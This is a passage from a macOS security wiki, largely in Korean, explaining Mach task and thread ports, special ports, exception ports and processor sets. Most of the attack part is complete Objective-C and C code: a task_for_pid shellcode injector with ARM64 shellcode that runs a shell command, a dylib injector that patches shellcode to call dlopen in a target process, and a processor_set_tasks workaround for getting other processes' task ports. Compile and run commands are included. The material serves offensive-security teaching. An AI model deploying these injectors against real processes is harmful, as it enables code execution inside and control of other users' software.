* **TASK\_KERNEL\_PORT**\[task-self send right]: 이 작업을 제어하는 데 사용되는 포트입니다. 작업에 영향을 미치는 메시지를 보내는 데 사용됩니다. 이는 **mach\_task\_self (아래의 Task Ports 참조)**에 의해 반환되는 포트입니다.
* **TASK\_BOOTSTRAP\_PORT**\[bootstrap send right]: 작업의 부트스트랩 포트입니다. 다른 시스템 서비스 포트의 반환을 요청하는 메시지를 보내는 데 사용됩니다.
* **TASK\_HOST\_NAME\_PORT**\[host-self send right]: 포함된 호스트의 정보를 요청하는 데 사용되는 포트입니다. 이는 **mach\_host\_self**에 의해 반환되는 포트입니다.
* **TASK\_WIRED\_LEDGER\_PORT**\[ledger send right]: 이 작업이 고정 커널 메모리를 가져오는 출처를 지정하는 포트입니다.
* **TASK\_PAGED\_LEDGER\_PORT**\[ledger send right]: 이 작업이 기본 메모리 관리 메모리를 가져오는 출처를 지정하는 포트입니다.

### Task Ports

원래 Mach는 "프로세스"가 아닌 "작업"을 가지고 있었으며, 이는 스레드의 컨테이너에 더 가깝다고 여겨졌습니다. Mach가 BSD와 병합되면서 **각 작업은 BSD 프로세스와 연관되었습니다**. 따라서 모든 BSD 프로세스는 프로세스가 되기 위해 필요한 세부 정보를 가지고 있으며, 모든 Mach 작업도 내부 작동을 가지고 있습니다(존재하지 않는 pid 0인 `kernel_task`를 제외하고).

이와 관련된 두 가지 매우 흥미로운 함수가 있습니다:

* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: 지정된 `pid`와 관련된 작업의 작업 포트에 대한 SEND 권한을 가져와서 지정된 `target_task_port`에 제공합니다(일반적으로 `mach_task_self()`를 사용한 호출 작업이지만, 다른 작업의 SEND 포트일 수도 있습니다).
* `pid_for_task(task, &pid)`: 작업에 대한 SEND 권한이 주어지면, 이 작업이 어떤 PID와 관련이 있는지 찾습니다.

작업 내에서 작업을 수행하기 위해서는 작업이 `mach_task_self()`를 호출하여 자신에 대한 `SEND` 권한이 필요했습니다(이는 `task_self_trap`(28)을 사용합니다). 이 권한으로 작업은 다음과 같은 여러 작업을 수행할 수 있습니다:

* `task_threads`: 작업의 스레드에 대한 모든 작업 포트에 대한 SEND 권한을 가져옵니다.
* `task_info`: 작업에 대한 정보를 가져옵니다.
* `task_suspend/resume`: 작업을 일시 중지하거나 재개합니다.
* `task_[get/set]_special_port`
* `thread_create`: 스레드를 생성합니다.
* `task_[get/set]_state`: 작업 상태를 제어합니다.
* 더 많은 내용은 [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)에서 확인할 수 있습니다.

{% hint style="danger" %}
다른 작업의 작업 포트에 대한 SEND 권한이 있으면, 다른 작업에 대해 이러한 작업을 수행할 수 있습니다.
{% endhint %}

게다가, task\_port는 **`vm_map`** 포트이기도 하며, 이는 `vm_read()` 및 `vm_write()`와 같은 함수를 사용하여 작업 내에서 **메모리를 읽고 조작**할 수 있게 해줍니다. 이는 기본적으로 다른 작업의 task\_port에 대한 SEND 권한이 있는 작업이 **해당 작업에 코드를 주입할 수 있음을 의미합니다**.

**커널도 작업이기 때문에**, 누군가가 **`kernel_task`**에 대한 **SEND 권한**을 얻으면, 커널이 무엇이든 실행하도록 만들 수 있습니다(탈옥).

* 호출 작업에 대한 이 포트의 **이름을 얻기 위해** `mach_task_self()`를 호출합니다. 이 포트는 **`exec()`**를 통해서만 **상속**됩니다; `fork()`로 생성된 새로운 작업은 새로운 작업 포트를 얻습니다(특별한 경우로, suid 바이너리에서 `exec()` 후에도 작업은 새로운 작업 포트를 얻습니다). 작업을 생성하고 포트를 얻는 유일한 방법은 `fork()`를 수행하면서 ["포트 스왑 댄스"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)를 수행하는 것입니다.
* 포트에 접근하기 위한 제한 사항은 다음과 같습니다(바이너리 `AppleMobileFileIntegrity`의 `macos_task_policy`에서):
* 앱이 **`com.apple.security.get-task-allow` 권한**을 가지고 있으면, **같은 사용자**의 프로세스가 작업 포트에 접근할 수 있습니다(일반적으로 디버깅을 위해 Xcode에 의해 추가됨). **노타리제이션** 프로세스는 이를 프로덕션 릴리스에서 허용하지 않습니다.
* **`com.apple.system-task-ports`** 권한이 있는 앱은 **커널을 제외한 모든** 프로세스의 **작업 포트**를 얻을 수 있습니다. 이전 버전에서는 **`task_for_pid-allow`**라고 불렸습니다. 이는 Apple 애플리케이션에만 부여됩니다.
* **루트는** **하드닝** 런타임으로 컴파일되지 않은 애플리케이션의 작업 포트에 접근할 수 있습니다(Apple이 아닌 경우).

**작업 이름 포트:** _작업 포트_의 비특권 버전입니다. 작업을 참조하지만 이를 제어할 수는 없습니다. 이를 통해 사용할 수 있는 유일한 것은 `task_info()`인 것 같습니다.

### Thread Ports

스레드에도 관련 포트가 있으며, 이는 **`task_threads`**를 호출하는 작업과 `processor_set_threads`를 통해 볼 수 있습니다. 스레드 포트에 대한 SEND 권한은 `thread_act` 서브시스템의 함수를 사용할 수 있게 해줍니다, 예를 들어:

* `thread_terminate`
* `thread_[get/set]_state`
* `act_[get/set]_state`
* `thread_[suspend/resume]`
* `thread_info`
* ...

모든 스레드는 **`mach_thread_sef`**를 호출하여 이 포트를 얻을 수 있습니다.

### Shellcode Injection in thread via Task port

다음에서 셸코드를 가져올 수 있습니다:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**이전 프로그램을 컴파일하고 동일한 사용자로 코드를 주입할 수 있도록 **권한**을 추가하십시오(그렇지 않으면 **sudo**를 사용해야 합니다).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
이 작업이 iOS에서 작동하려면 쓰기 가능한 메모리 실행 파일을 만들기 위해 `dynamic-codesigning` 권한이 필요합니다.
{% endhint %}

### Task 포트를 통한 스레드에서의 Dylib 주입

macOS에서 **스레드**는 **Mach** 또는 **posix `pthread` api**를 사용하여 조작할 수 있습니다. 이전 주입에서 생성한 스레드는 Mach api를 사용하여 생성되었으므로 **posix 호환성이 없습니다**.

**단순한 셸코드**를 주입하여 명령을 실행할 수 있었던 이유는 **posix** 호환 api와 작업할 필요가 없었기 때문입니다. **더 복잡한 주입**은 **스레드**가 또한 **posix 호환성**을 가져야 합니다.

따라서 **스레드**를 **개선하기 위해**는 **`pthread_create_from_mach_thread`**를 호출해야 하며, 이는 **유효한 pthread**를 생성합니다. 그런 다음, 이 새로운 pthread는 **dlopen**을 호출하여 시스템에서 **dylib**를 **로드**할 수 있습니다. 따라서 다양한 작업을 수행하기 위해 새로운 셸코드를 작성하는 대신 사용자 정의 라이브러리를 로드할 수 있습니다.

**예제 dylibs**는 (예를 들어 로그를 생성하고 이를 수신할 수 있는 것) 다음에서 찾을 수 있습니다:

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
```markdown
</details>
```
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

이 기술에서는 프로세스의 스레드가 하이재킹됩니다:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

### Task Port Injection Detection

`task_for_pid` 또는 `thread_create_*`를 호출할 때 커널의 struct task에서 카운터가 증가하며, 이는 사용자 모드에서 task\_info(task, TASK\_EXTMOD\_INFO, ...)를 호출하여 접근할 수 있습니다.

## Exception Ports

스레드에서 예외가 발생하면, 이 예외는 스레드의 지정된 예외 포트로 전송됩니다. 스레드가 이를 처리하지 않으면, 작업 예외 포트로 전송됩니다. 작업이 이를 처리하지 않으면, launchd에 의해 관리되는 호스트 포트로 전송됩니다(여기서 인식됩니다). 이를 예외 분류라고 합니다.

일반적으로 적절히 처리되지 않으면 보고서는 ReportCrash 데몬에 의해 처리됩니다. 그러나 같은 작업의 다른 스레드가 예외를 관리할 수 있는 가능성이 있으며, 이것이 `PLCreashReporter`와 같은 크래시 보고 도구가 하는 일입니다.

## Other Objects

### Clock

모든 사용자는 시계에 대한 정보를 접근할 수 있지만, 시간을 설정하거나 다른 설정을 수정하려면 루트 권한이 필요합니다.

정보를 얻기 위해 `clock` 서브시스템의 함수인 `clock_get_time`, `clock_get_attributtes` 또는 `clock_alarm`을 호출할 수 있습니다.\
값을 수정하기 위해 `clock_priv` 서브시스템을 사용하여 `clock_set_time` 및 `clock_set_attributes`와 같은 함수를 사용할 수 있습니다.

### Processors and Processor Set

프로세서 API는 `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`와 같은 함수를 호출하여 단일 논리 프로세서를 제어할 수 있게 해줍니다.

게다가, **프로세서 세트** API는 여러 프로세서를 그룹으로 묶는 방법을 제공합니다. **`processor_set_default`**를 호출하여 기본 프로세서 세트를 검색할 수 있습니다.\
프로세서 세트와 상호작용하기 위한 몇 가지 흥미로운 API는 다음과 같습니다:

* `processor_set_statistics`
* `processor_set_tasks`: 프로세서 세트 내의 모든 작업에 대한 전송 권한 배열을 반환합니다.
* `processor_set_threads`: 프로세서 세트 내의 모든 스레드에 대한 전송 권한 배열을 반환합니다.
* `processor_set_stack_usage`
* `processor_set_info`

[**이 게시물**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)에서 언급했듯이, 과거에는 이 기능을 사용하여 다른 프로세스의 작업 포트를 얻고 이를 제어할 수 있었습니다. **`processor_set_tasks`**를 호출하고 모든 프로세스에서 호스트 포트를 얻는 방식으로 말이죠.\
현재는 이 기능을 사용하려면 루트 권한이 필요하며, 보호되어 있어 보호되지 않은 프로세스에서만 이러한 포트를 얻을 수 있습니다.

다음과 같이 시도해 볼 수 있습니다:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
* [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
